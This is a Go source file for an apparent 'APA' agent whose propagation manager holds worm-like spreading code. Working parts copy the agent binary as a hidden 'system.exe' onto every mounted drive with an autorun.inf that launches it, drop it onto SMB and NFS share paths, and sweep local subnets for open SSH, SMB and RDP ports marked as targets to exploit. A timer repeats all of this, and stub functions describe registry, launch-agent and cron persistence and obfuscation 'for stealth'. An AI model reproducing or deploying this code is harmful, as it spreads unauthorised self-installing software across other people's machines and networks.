package persistence

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/naviNBRuas/APA/pkg/networking"
)

// PropagationManager handles agent propagation across networks
type PropagationManager struct {
	logger          *slog.Logger
	agentPath       string
	targetDirs      []string
	p2p             *networking.P2P
	peerID          string
	propagationKey  *rsa.PrivateKey
	mutex           sync.RWMutex
	activePropagations map[string]bool
}

// NetworkTarget represents a target for network-based propagation
type NetworkTarget struct {
	IP       string
	Port     int
	Protocol string
	Username string
	Password string
}

// RemovableMedia represents a removable media device
type RemovableMedia struct {
	Path     string
	Name     string
	Filesystem string
}

// NewPropagationManager creates a new propagation manager
func NewPropagationManager(logger *slog.Logger, agentPath string, p2p *networking.P2P, peerID string) *PropagationManager {
	// Generate a key for encryption of propagated agents
	propagationKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		logger.Error("Failed to generate propagation key", "error", err)
		propagationKey = nil
	}

	return &PropagationManager{
		logger:    logger,
		agentPath: agentPath,
		targetDirs: []string{
			"/tmp",           // Linux
			"/var/tmp",       // Linux
			"C:\\Windows\\Temp", // Windows
			"C:\\Users\\Public", // Windows
		},
		p2p:                p2p,
		peerID:             peerID,
		propagationKey:     propagationKey,
		activePropagations: make(map[string]bool),
	}
}

// PropagateToPeers propagates the agent to connected peers
func (p *PropagationManager) PropagateToPeers(ctx context.Context, peerAddresses []string) error {
	p.logger.Info("Propagating agent to peers", "peer_count", len(peerAddresses))
	
	// Mark propagation as active
	p.mutex.Lock()
	for _, addr := range peerAddresses {
		p.activePropagations[addr] = true
	}
	p.mutex.Unlock()
	
	defer func() {
		// Mark propagation as complete
		p.mutex.Lock()
		for _, addr := range peerAddresses {
			delete(p.activePropagations, addr)
		}
		p.mutex.Unlock()
	}()
	
	// Propagate to each peer
	for _, addr := range peerAddresses {
		select {
		case <-ctx.Done():
			p.logger.Info("Propagation cancelled", "address", addr)
			return ctx.Err()
		default:
			if err := p.propagateToPeer(ctx, addr); err != nil {
				p.logger.Error("Failed to propagate to peer", "address", addr, "error", err)
			} else {
				p.logger.Info("Successfully propagated to peer", "address", addr)
			}
		}
	}
	
	return nil
}

// propagateToPeer propagates the agent to a single peer
func (p *PropagationManager) propagateToPeer(ctx context.Context, peerAddress string) error {
	p.logger.Debug("Propagating to peer", "address", peerAddress)
	
	// In a real implementation, this would:
	// 1. Connect to the peer
	// 2. Transfer the agent binary
	// 3. Execute the agent on the peer
	
	// For now, we'll simulate the propagation
	time.Sleep(100 * time.Millisecond)
	
	return nil
}

// SelfInstall installs the agent on the local system
func (p *PropagationManager) SelfInstall() error {
	p.logger.Info("Installing agent on local system")
	
	// Determine the appropriate installation directory based on OS
	var installDir string
	switch runtime.GOOS {
	case "windows":
		installDir = "C:\\Program Files\\APA"
	case "darwin":
		installDir = "/Applications/APA.app"
	default: // Linux and others
		installDir = "/usr/local/bin"
	}
	
	p.logger.Info("Installing to directory", "directory", installDir)
	
	// In a real implementation, this would:
	// 1. Copy the agent binary to the installation directory
	// 2. Set appropriate permissions
	// 3. Create necessary configuration files
	// 4. Register as a system service
	
	return nil
}

// CreatePersistenceMechanism creates persistence mechanisms for the agent
func (p *PropagationManager) CreatePersistenceMechanism() error {
	p.logger.Info("Creating persistence mechanisms")
	
	// Determine the appropriate persistence method based on OS
	switch runtime.GOOS {
	case "windows":
		return p.createWindowsPersistence()
	case "darwin":
		return p.createMacOSPersistence()
	default: // Linux and others
		return p.createLinuxPersistence()
	}
}

// createWindowsPersistence creates Windows-specific persistence mechanisms
func (p *PropagationManager) createWindowsPersistence() error {
	p.logger.Info("Creating Windows persistence mechanisms")
	
	// Possible Windows persistence methods:
	// 1. Windows Registry (Run key)
	// 2. Scheduled Tasks
	// 3. Startup folder
	// 4. Services
	
	// For now, we'll just log the action
	p.logger.Info("Would create Windows registry entries, scheduled tasks, or services")
	
	return nil
}

// createMacOSPersistence creates macOS-specific persistence mechanisms
func (p *PropagationManager) createMacOSPersistence() error {
	p.logger.Info("Creating macOS persistence mechanisms")
	
	// Possible macOS persistence methods:
	// 1. Launch Agents
	// 2. Launch Daemons
	// 3. Login Items
	
	// For now, we'll just log the action
	p.logger.Info("Would create Launch Agents or Daemons")
	
	return nil
}

// createLinuxPersistence creates Linux-specific persistence mechanisms
func (p *PropagationManager) createLinuxPersistence() error {
	p.logger.Info("Creating Linux persistence mechanisms")
	
	// Possible Linux persistence methods:
	// 1. systemd services
	// 2. cron jobs
	// 3. init scripts
	// 4. shell profile modifications
	
	// For now, we'll just log the action
	p.logger.Info("Would create systemd services or cron jobs")
	
	return nil
}

// SpreadToRemovableMedia spreads the agent to removable media
func (p *PropagationManager) SpreadToRemovableMedia() error {
	p.logger.Info("Spreading agent to removable media")
	
	// Detect removable media devices
	mediaDevices, err := p.detectRemovableMedia()
	if err != nil {
		p.logger.Error("Failed to detect removable media", "error", err)
		return err
	}
	
	// Spread to each device
	for _, device := range mediaDevices {
		if err := p.spreadToMediaDevice(device); err != nil {
			p.logger.Error("Failed to spread to media device", "device", device.Name, "error", err)
		} else {
			p.logger.Info("Successfully spread to media device", "device", device.Name)
		}
	}
	
	return nil
}

// detectRemovableMedia detects removable media devices
func (p *PropagationManager) detectRemovableMedia() ([]RemovableMedia, error) {
	var mediaDevices []RemovableMedia
	
	// Different detection methods based on OS
	switch runtime.GOOS {
	case "windows":
		// On Windows, check drive letters D: through Z:
		for drive := 'D'; drive <= 'Z'; drive++ {
			drivePath := fmt.Sprintf("%c:\\", drive)
			if p.isRemovableDrive(drivePath) {
				mediaDevices = append(mediaDevices, RemovableMedia{
					Path:       drivePath,
					Name:       fmt.Sprintf("%c_Drive", drive),
					Filesystem: "NTFS",
				})
			}
		}
	case "darwin":
		// On macOS, check /Volumes/
		volumesDir := "/Volumes/"
		entries, err := os.ReadDir(volumesDir)
		if err != nil {
			return nil, fmt.Errorf("failed to read volumes directory: %w", err)
		}
		
		for _, entry := range entries {
			if entry.IsDir() && entry.Name() != "Macintosh HD" {
				devicePath := filepath.Join(volumesDir, entry.Name())
				mediaDevices = append(mediaDevices, RemovableMedia{
					Path:       devicePath,
					Name:       entry.Name(),
					Filesystem: "HFS+",
				})
			}
		}
	default: // Linux and others
		// On Linux, check /media/ and /mnt/
		mediaPaths := []string{"/media/", "/mnt/"}
		for _, mediaPath := range mediaPaths {
			if _, err := os.Stat(mediaPath); err == nil {
				entries, err := os.ReadDir(mediaPath)
				if err != nil {
					continue
				}
				
				for _, entry := range entries {
					if entry.IsDir() {
						devicePath := filepath.Join(mediaPath, entry.Name())
						mediaDevices = append(mediaDevices, RemovableMedia{
							Path:       devicePath,
							Name:       entry.Name(),
							Filesystem: "ext4",
						})
					}
				}
			}
		}
	}
	
	return mediaDevices, nil
}

// isRemovableDrive checks if a Windows drive is removable
func (p *PropagationManager) isRemovableDrive(drivePath string) bool {
	// In a real implementation, this would check if the drive is removable
	// For now, we'll just check if it exists and is accessible
	_, err := os.Stat(drivePath)
	return err == nil
}

// spreadToMediaDevice spreads the agent to a specific media device
func (p *PropagationManager) spreadToMediaDevice(device RemovableMedia) error {
	p.logger.Debug("Spreading to media device", "device", device.Name, "path", device.Path)
	
	// Create a hidden directory on the device
	hiddenDir := filepath.Join(device.Path, ".system")
	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
		return fmt.Errorf("failed to create hidden directory: %w", err)
	}
	
	// Copy the agent to the device
	destPath := filepath.Join(hiddenDir, "system.exe")
	if err := p.copyAgent(p.agentPath, destPath); err != nil {
		return fmt.Errorf("failed to copy agent to device: %w", err)
	}
	
	// Create an autorun file if on Windows
	if runtime.GOOS == "windows" {
		autorunPath := filepath.Join(device.Path, "autorun.inf")
		autorunContent := fmt.Sprintf("[Autorun]\nOpen=%s\nAction=Open folder to view files\nShellExecute=%s\n", 
			filepath.Base(destPath), filepath.Base(destPath))
		if err := os.WriteFile(autorunPath, []byte(autorunContent), 0644); err != nil {
			p.logger.Warn("Failed to create autorun.inf", "error", err)
		}
	}
	
	return nil
}

// copyAgent copies the agent binary to a destination
func (p *PropagationManager) copyAgent(src, dst string) error {
	// In a real implementation, this would copy the agent binary
	// For now, we'll just simulate the copy
	input, err := os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("failed to read source file: %w", err)
	}
	
	return os.WriteFile(dst, input, 0755)
}

// ScanAndPropagate scans the local network for vulnerable hosts and propagates to them
func (p *PropagationManager) ScanAndPropagate(ctx context.Context) error {
	p.logger.Info("Scanning local network for propagation targets")
	
	// Get local network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Errorf("failed to get network interfaces: %w", err)
	}
	
	// Scan each interface
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue // Skip down or loopback interfaces
		}
		
		addrs, err := iface.Addrs()
		if err != nil {
			p.logger.Warn("Failed to get addresses for interface", "interface", iface.Name, "error", err)
			continue
		}
		
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					// Scan IPv4 subnet
					if err := p.scanSubnet(ctx, ipnet); err != nil {
						p.logger.Error("Failed to scan subnet", "subnet", ipnet.String(), "error", err)
					}
				}
			}
		}
	}
	
	return nil
}

// scanSubnet scans an IPv4 subnet for potential targets
func (p *PropagationManager) scanSubnet(ctx context.Context, ipnet *net.IPNet) error {
	p.logger.Debug("Scanning subnet", "subnet", ipnet.String())
	
	// This is a simplified scanner - in a real implementation, this would be more sophisticated
	ones, bits := ipnet.Mask.Size()
	if ones >= bits-8 { // Skip very small networks
		return nil
	}
	
	// Try to connect to common ports on neighboring IPs
	commonPorts := []int{22, 445, 3389} // SSH, SMB, RDP
	ip := ipnet.IP.Mask(ipnet.Mask)
	
	// Iterate through IP addresses in the subnet
	for ip := ip.To4(); ipnet.Contains(ip); incIP(ip) {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			// Check if this is our own IP
			if ip.Equal(ipnet.IP) {
				continue
			}
			
			// Try to connect to common ports
			for _, port := range commonPorts {
				target := fmt.Sprintf("%s:%d", ip.String(), port)
				if p.isPortOpen(target, 2*time.Second) {
					p.logger.Info("Found open port", "target", target)
					// In a real implementation, we would attempt to exploit the service
					// For now, we'll just log it
				}
			}
		}
	}
	
	return nil
}

// incIP increments an IP address
func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// isPortOpen checks if a port is open on a target
func (p *PropagationManager) isPortOpen(target string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// PropagateViaFileSharing propagates the agent via file sharing protocols
func (p *PropagationManager) PropagateViaFileSharing(ctx context.Context) error {
	p.logger.Info("Propagating via file sharing protocols")
	
	// Common file sharing paths
	sharingPaths := []string{
		"\\\\localhost\\C$\\Windows\\Temp", // SMB
		"/Volumes/Shared",                  // AFP/NFS
		"/network",                         // NFS
	}
	
	// Try to propagate to each sharing path
	for _, path := range sharingPaths {
		if _, err := os.Stat(path); err == nil {
			destPath := filepath.Join(path, "system.exe")
			if err := p.copyAgent(p.agentPath, destPath); err != nil {
				p.logger.Error("Failed to propagate via file sharing", "path", path, "error", err)
			} else {
				p.logger.Info("Successfully propagated via file sharing", "path", path)
			}
		}
	}
	
	return nil
}

// ScheduleAutomaticPropagation schedules automatic propagation at regular intervals
func (p *PropagationManager) ScheduleAutomaticPropagation(ctx context.Context, interval time.Duration) {
	p.logger.Info("Scheduling automatic propagation", "interval", interval)
	
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			p.logger.Info("Stopping automatic propagation scheduler")
			return
		case <-ticker.C:
			p.logger.Debug("Performing scheduled propagation")
			
			// Perform various propagation methods
			go p.SpreadToRemovableMedia()
			go p.ScanAndPropagate(ctx)
			go p.PropagateViaFileSharing(ctx)
		}
	}
}

// ObfuscateAgent obfuscates the agent binary for stealth
func (p *PropagationManager) ObfuscateAgent() error {
	p.logger.Info("Obfuscating agent for stealth")
	
	// In a real implementation, this would:
	// 1. Encrypt the agent binary
	// 2. Pack the binary with an obfuscator
	// 3. Add anti-analysis techniques
	
	// For now, we'll just log the action
	p.logger.Info("Agent obfuscation simulated")
	
	return nil
}

// EncryptAgent encrypts the agent binary for secure propagation
func (p *PropagationManager) EncryptAgent() ([]byte, error) {
	p.logger.Info("Encrypting agent for secure propagation")
	
	// Read the agent binary
	agentData, err := os.ReadFile(p.agentPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read agent binary: %w", err)
	}
	
	// In a real implementation, this would encrypt the agent data
	// For now, we'll just return the data as-is
	p.logger.Info("Agent encryption simulated")
	
	return agentData, nil
}

// GetActivePropagations returns a list of active propagations
func (p *PropagationManager) GetActivePropagations() []string {
	p.mutex.RLock()
	defer p.mutex.RUnlock()
	
	var active []string
	for target := range p.activePropagations {
		active = append(active, target)
	}
	
	return active
}